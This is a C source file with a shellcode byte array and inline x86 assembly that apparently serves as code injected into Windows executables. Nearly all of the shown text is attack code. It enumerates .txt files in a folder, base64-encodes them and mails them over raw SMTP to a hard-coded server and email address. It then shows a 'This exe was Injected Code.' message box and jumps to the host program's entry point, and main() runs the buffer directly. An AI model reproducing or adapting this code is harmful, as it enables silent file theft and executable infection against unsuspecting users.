0x8D,0x85,0xE8,0xFD,0xFF,0xFF,
0x50,
0x8B,0x45,0x08,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0x63,0x00,0x00,0x00,
0x83,0xC4,0x0C,
0x8B,0x45,0x10,
0x50,
0xBB,0xD7,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0x38,0xFE,0xFF,0xFF,
0x83,0xC4,0x0C,
0x8D,0x85,0xBC,0xFD,0xFF,0xFF,
0x50,
0x8B,0x85,0xB8,0xFD,0xFF,0xFF,
0x50,
0xB8,0x51,0x4F,0x83,0x7C,
0xFF,0xD0,
0x89,0x85,0xB4,0xFD,0xFF,0xFF,
0xB8,0x01,0x00,0x00,0x00,
0x3B,0x85,0xB4,0xFD,0xFF,0xFF,
0x0F,0x84,0x74,0xFF,0xFF,0xFF,
0x8B,0x85,0xE8,0xFD,0xFF,0xFF,
0x50,
0xB8,0x9C,0xEE,0x80,0x7C,
0xFF,0xD0,
0x5F,
0x5E,
0x5B,
0x81,0xC4,0x00,0x04,0x00,0x00,
0x5D,
0xC3,
0x55,
0x89,0xE5,
0x83,0xEC,0x0C,
0x53,
0x56,
0x57,
0x8D,0x7D,0xF4,
0xB9,0x03,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0x8B,0x45,0x10,
0x50,
0x8B,0x45,0x0C,
0x50,
0xBB,0x46,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8B,0x45,0x08,
0x50,
0xB8,0xB4,0x45,0x92,0x7C,
0xFF,0xD0,
0x83,0xC4,0x10,
0x5F,
0x5E,
0x5B,
0x83,0xC4,0x0C,
0x5D,
0xC3,
0x55,
0x89,0xE5,
0x83,0xEC,0x0C,
0x53,
0x56,
0x57,
0x8D,0x7D,0xF4,
0xB9,0x03,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0x8B,0x45,0x0C,
0x50,
0x6A,0x00,
0x8B,0x45,0x08,
0x50,
0xB8,0x35,0x24,0x90,0x7C,
0xFF,0xD0,
0x83,0xC4,0x0C,
0x5F,
0x5E,
0x5B,
0x83,0xC4,0x0C,
0x5D,
0xC3,
0x55,
0x89,0xE5,
0x81,0xEC,0x00,0x02,0x00,0x00,
0x53,
0x56,
0x57,
0x8D,0xBD,0x00,0xFE,0xFF,0xFF,
0xB9,0x40,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0xB8,0x01,0x00,0x00,0x00,
0x50,
0xB8,0x46,0x24,0x80,0x7C,
0xFF,0xD0,
0x8B,0x45,0x08,
0x50,
0xBB,0x4C,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xB8,0xB4,0x45,0x92,0x7C,
0xFF,0xD0,
0x83,0xC4,0x0C,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xB8,0x45,0x26,0x90,0x7C,
0xFF,0xD0,
0x83,0xC4,0x04,
0x89,0x85,0xF8,0xFE,0xFF,0xFF,
0x6A,0x00,
0x8B,0x85,0xF8,0xFE,0xFF,0xFF,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0x8B,0x45,0x10,
0x50,
0xB8,0x27,0x4C,0xAB,0x71,
0xFF,0xD0,
0x6A,0x00,
0x68,0x80,0x00,0x00,0x00,
0x6A,0x03,
0x6A,0x00,
0x6A,0x01,
0x68,0x00,0x00,0x00,0x80,
0x8B,0x45,0x0C,
0x50,
0xB8,0x28,0x1A,0x80,0x7C,
0xFF,0xD0,
0x89,0x85,0xF4,0xFE,0xFF,0xFF,
0xB8,0xFF,0xFF,0xFF,0xFF,
0x3B,0x85,0xF4,0xFE,0xFF,0xFF,
0x0F,0x84,0xA6,0x00,0x00,0x00,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0x0D,0xFF,0xFF,0xFF,
0x83,0xC4,0x08,
0x6A,0x00,
0x8D,0x85,0xF0,0xFE,0xFF,0xFF,
0x50,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0x8B,0x85,0xF4,0xFE,0xFF,0xFF,
0x50,
0xB8,0x12,0x18,0x80,0x7C,
0xFF,0xD0,
0x89,0x85,0xEC,0xFE,0xFF,0xFF,
0xB8,0x00,0x00,0x00,0x00,
0x3B,0x85,0xEC,0xFE,0xFF,0xFF,
0x74,0x4E,
0x3B,0x85,0xF0,0xFE,0xFF,0xFF,
0x73,0x46,
0x6A,0x00,
0x8B,0x85,0xF0,0xFE,0xFF,0xFF,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0x8B,0x45,0x10,
0x50,
0xB8,0x27,0x4C,0xAB,0x71,
0xFF,0xD0,
0x6A,0x00,
0x8D,0x85,0xF0,0xFE,0xFF,0xFF,
0x50,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0x8B,0x85,0xF4,0xFE,0xFF,0xFF,
0x50,
0xB8,0x12,0x18,0x80,0x7C,
0xFF,0xD0,
0x89,0x85,0xEC,0xFE,0xFF,0xFF,
0xEB,0xA5,
0x8B,0x85,0xF4,0xFE,0xFF,0xFF,
0x50,
0xB8,0xE7,0x9B,0x80,0x7C,
0xFF,0xD0,
0x6A,0x00,
0x6A,0x02,
0xBB,0x43,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8B,0x45,0x10,
0x50,
0xB8,0x27,0x4C,0xAB,0x71,
0xFF,0xD0,
0x89,0x85,0xF8,0xFE,0xFF,0xFF,
0x5F,
0x5E,
0x5B,
0x81,0xC4,0x00,0x02,0x00,0x00,
0x5D,
0xC3,
0x5F,
0x5E,
0x5B,
0x83,0xC4,0x0C,
0x89,0xEC,
0x5D,
0xC3,
0x55,
0x89,0xE5,
0x83,0xEC,0x0C,
0x53,
0x56,
0x57,
0x8D,0x7D,0xF4,
0xB9,0x03,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0x6A,0x00,
0x6A,0x09,
0xBB,0x35,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8B,0x45,0x08,
0x50,
0xB8,0x27,0x4C,0xAB,0x71,
0xFF,0xD0,
0x89,0x45,0xD4,
0xB8,0x09,0x00,0x00,0x00,
0x39,0x45,0xD4,
0x75,0x08,
0x5F,
0x5E,
0x5B,
0x83,0xC4,0x0C,
0x5D,
0xC3,
0x8B,0x45,0xE0,
0x50,
0xB8,0x2B,0x3E,0xAB,0x71,
0xFF,0xD0,
0x89,0x45,0xD4,
0xB8,0xED,0x3F,0xAB,0x71,
0xFF,0xD0,
0x89,0x45,0xD4,
0x5F,
0x5E,
0x5B,
0x81,0xC4,0x00,0x04,0x00,0x00,
0x89,0xEC,
0x5D,
0xB8,0x50,0x1F,0x40,0x00,
0xFF,0xE0,
0x55,
0x89,0xE5,
0x83,0xEC,0x0C,
0x53,
0x56,
0x57,
0x8D,0x7D,0xF4,
0xB9,0x03,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0xB8,0xE9,0x07,0x00,0x00,
0x01,0xF0,
0x50,
0xB8,0x7B,0x1D,0x80,0x7C,
0xFF,0xD0,
0x6A,0x00,
0xB8,0xF4,0x07,0x00,0x00,
0x01,0xF0,
0x50,
0xB8,0xFF,0x07,0x00,0x00,
0x01,0xF0,
0x50,
0x6A,0x00,
0xB8,0xEA,0x07,0x45,0x7E,
0xFF,0xD0,
0x5F,
0x5E,
0x5B,
0x83,0xC4,0x0C,
0x5D,
0xC3,
0x48,0x45,0x4C,0x4F,0x20,0x31,0x30,0x2E,0x31,
0x30,0x2E,0x31,0x2E,0x39,0x0D,0x0A,0x41,0x55,
0x54,0x4F,0x20,0x4C,0x4F,0x47,0x49,0x4E,0x0D,
0x0A,0x4D,0x41,0x49,0x4C,0x20,0x46,0x52,0x4F,
0x4D,0x3A,0x20,0x3C,0x6C,0x69,0x75,0x6A,0x69,
0x71,0x75,0x61,0x6E,0x40,0x61,0x73,0x65,0x2E,
0x63,0x6F,0x6D,0x2E,0x63,0x6E,0x3E,0x0D,0x0A,
0x52,0x43,0x50,0x54,0x20,0x54,0x4F,0x3A,0x20,
0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61,
0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D,
0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x44,0x41,0x54,
0x41,0x0D,0x0A,0x46,0x72,0x6F,0x6D,0x3A,0x20,
0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61,
0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D,
0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x54,0x6F,0x3A,
0x20,0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,
0x61,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,
0x6D,0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x44,0x61,
0x74,0x65,0x3A,0x20,0x32,0x30,0x31,0x34,0x2F,
0x30,0x39,0x2F,0x32,0x36,0x20,0x31,0x31,0x3A,
0x31,0x36,0x0D,0x0A,0x53,0x75,0x62,0x6A,0x65,
0x63,0x74,0x3A,0x4F,0x6E,0x65,0x20,0x4D,0x61,
0x69,0x6C,0x0D,0x0A,0x4D,0x69,0x6D,0x65,0x2D,
0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3A,0x20,
0x31,0x2E,0x30,0x0D,0x0A,0x43,0x6F,0x6E,0x74,
0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x3A,
0x20,0x6D,0x75,0x6C,0x74,0x69,0x70,0x61,0x72,
0x74,0x2F,0x6D,0x69,0x78,0x65,0x64,0x3B,0x20,
0x62,0x6F,0x75,0x6E,0x64,0x61,0x72,0x79,0x3D,
0x22,0x49,0x4E,0x56,0x54,0x22,0x0D,0x0A,0x00,
0x2E,0x0D,0x0A,0x51,0x55,0x49,0x54,0x0D,0x0A,
0x00,
0x2A,0x2E,0x2A,0x00,
0x0D,0x0A,0x00,
0x25,0x73,0x5C,0x25,0x73,0x00,
0x2D,0x2D,0x49,0x4E,0x56,0x54,0x0D,0x0A,0x43,
0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x74,0x79,
0x70,0x65,0x3A,0x20,0x61,0x70,0x70,0x6C,0x69,
0x63,0x61,0x74,0x69,0x6F,0x6E,0x2F,0x6F,0x63,
0x74,0x65,0x74,0x2D,0x73,0x74,0x72,0x65,0x61,
0x6D,0x3B,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65,
0x6E,0x74,0x2D,0x54,0x72,0x61,0x6E,0x73,0x66,
0x65,0x72,0x2D,0x45,0x6E,0x63,0x6F,0x64,0x69,
0x6E,0x67,0x3A,0x20,0x62,0x61,0x73,0x70,0x36,
0x34,0x3B,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65,
0x6E,0x74,0x2D,0x44,0x69,0x73,0x70,0x6F,0x73,
0x69,0x74,0x69,0x6F,0x6E,0x3A,0x20,0x61,0x74,
0x74,0x61,0x63,0x68,0x6D,0x65,0x6E,0x74,0x3B,
0x0D,0x0A,0x20,0x20,0x66,0x69,0x6C,0x65,0x6E,
0x61,0x6D,0x65,0x3D,0x22,0x25,0x73,0x22,0x0D,
0x0A,0x0D,0x0A,0x00,
0x2A,0x2E,0x74,0x78,0x74,0x00,
0x43,0x3A,0x5C,0x57,0x6F,0x72,0x6B,0x5C,0x50,
0x69,0x63,0x00,
0x75,0x73,0x65,0x72,0x33,0x32,0x2E,0x64,0x6C,
0x6C,0x00,
0x49,0x6E,0x66,0x6F,0x6D,0x61,0x74,0x69,0x6F,
0x6E,0x00,
0x54,0x68,0x69,0x73,0x20,0x65,0x78,0x65,0x20,
0x77,0x61,0x73,0x20,0x49,0x6E,0x6A,0x65,0x63,
0x74,0x65,0x64,0x20,0x43,0x6F,0x64,0x65,0x2E,
0x00	
};
#include <WINSOCK2.H>

void Test()
{
char* buffer1= "ws2_32.dll";
char* buffer2 = "HELO 10.10.1.9\r\n";
char* buffer3 = "AUTO LOGIN\r\n";
char* buffer4 = "MAIL FROM: liujiquan@ase.com.cn\r\n";
char* buffer5 = "RCPT TO: liujiquan@ase.com.cn\r\\n";
char* buffer6 = "DATA\r\n";
char* buffer7 = "From: <liujiquan@ase.com.cn>\r\nTo: <liujiquan@ase.com.cn>\r\nDate: 2014/09/17 16:57\r\nSubject:One Mail\\r\\nMime-Version: 1.0\\r\\nContent-Type: multipart/mixed; boundary=\"INVT\"\r\n";
char* buffer8 = "--INVT--\r\n.\\r\n";
char* buffer9 = "QUIT\r\n";
char* buffer10 = "user32.dll";
char* buffer11 = "123";
char* buffer12 = "456";
_asm {
	
$begin:
	call $init
		
$init:	
	push	buffer1
	mov		eax,7c801d78h			;LoadLibrayA
	call	eax
	call 	$wsasatrtup		
			
$wsasatrtup:						
	lea		eax, [ebp-190h]		
	push 	eax
	push 	202h
	mov		eax, 71AB6A55h
	call	eax						;WSAStartup(0x0202,&wsadata)
	test	eax,eax
	jne		$end
	call	$socket
	
$socket:
	push	0
	push	1
	push	2
	mov		eax, 71ab4211h
	call	eax							;socket(AF_INET,SOCK_STREAM,IPPROTO_IP); 
	mov		[ebp-20h],eax
	
	mov		eax,0FFh
	cmp     [ebp-20h],eax	;if(server == -1)
	jne     $connect 
	xor     eax,eax
	jmp     $WSACleanup	
$connect:
	mov		ax, 0002h
	mov		[ebp-20h-8h], ax
	mov		eax, 9010A0Ah
	mov		[ebp-20h-4h], eax
	mov		ax, 1900h
	mov		[ebp-20h-6h], ax
	push	10h					; push
	lea		ecx,[ebp-20h-8h]
	push 	ecx
	mov		eax, [ebp-20h]
	push 	eax
	mov		eax, 71ab4a07h		; connect
	call	eax
	
	mov		[ebp-20h-8h-4h],eax	;nRet
	mov		eax, 0H
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 0)
	jne     $closesocket 
}
buffer1 = "HELO 10.10.1.9\r\n";
buffer3 = "AUTO LOGIN\r\n";
_asm{	
$send1: 		
	push	0
	push	16
	call 	_send1Imp
;	db 		'HELO 10.10.1.9\r\n',0
_send1Imp:
	push	buffer1
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 10H
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 10)
	jne     $closesocket 
$send2: 	
	push	0
	push	0Ch
	call 	_send2Imp
;	db 		'AUTO LOGIN\r\n',0
_send2Imp:
	push	buffer3
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 0Ch
	cmp     [ebp-20h-8h-4h],eax		;	if(nRet == 0Ch)
	jne     $closesocket
$send3: 	
	push	0
	push	21h
	call 	_send3Imp
;	db 		'MAIL FROM: liujiquan@ase.com.cn\\r\\n',0
_send3Imp:
	push	buffer4
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 21h
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
$send4: 	
	push	0
	push	1Fh
	call 	_send4Imp
;	db 		'RCPT TO: liujiquan@ase.com.cn\\r\\n',0
_send4Imp:
	push	buffer5
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 1Fh
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
$send5: 	
	push	0
	push	06h
	call 	_send5Imp
;	db 		'DATA\\r\\n',0
_send5Imp:
	push	buffer6
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 06h
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
$send6: 	
	push	0
	push	0A7h
	call 	_send6Imp
;	db 		'From: <liujiquan@ase.com.cn>\\r\\nTo: <liujiquan@ase.com.cn>\\r\\nDate: 2014/09/17 16:57\\r\\nSubject:One Mail\\r\\nMime-Version: 1.0\\r\\nContent-Type: multipart/mixed; boundary=\"INVT\"\\r\\n',0
_send6Imp:
	push	buffer7
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 0A7h
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
$send7: 	
	push	0
	push	0Dh
	call 	_send7Imp
;	db 		'--INVT--\\r\\n.\\r\\n',0
_send7Imp:
	push	buffer8
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 0Dh
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
$send8: 	
	push	0
	push	06H
	call 	_send8Imp
;	db 		'QUIT\\r\n',0
_send8Imp:
	push	buffer9
	mov		eax, [ebp-20h]
	push	eax
	mov		eax, 71ab4c27h
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	mov		eax, 06H
	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 21h)
	jne     $closesocket 
				
$Msg:
	call 	Message
$closesocket: 
	mov		eax, [ebp-20h]
	push	eax	
	mov		eax, 0x71ab3e2b
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
$WSACleanup: 
	mov		eax, 0x71ab3fed
	call	eax
	mov		[ebp-20h-8h-4h],eax		;nRet
	call	$end
	
$end:
	mov		eax,00401f50H			;jmp end
	jmp		eax

Message:	
	call func0
;	db 'user32.dll',0  
func0:
	push	buffer10
	mov eax,7c801d7bH   ;LOADLIBRARYA
	CALL eax
	push 0           
	call Func1
;	db "Infomation",0   
Func1:
	call Func2

;	db "This exe was Injected Code.",0
Func2:
	push	buffer11
push	buffer12
	push 0  
	mov eax,7e4507eaH  ; 7e4507eaH  MESSAGEBOXA 
	call eax
	ret
	
	}
}
void main()
{
	HMODULE hModule = LoadLibrary("ws2_32.dll");
	__asm
	{
		lea esi,szbuffer
		jmp esi
	} 
	FreeLibrary(hModule);
//	Test();	
}


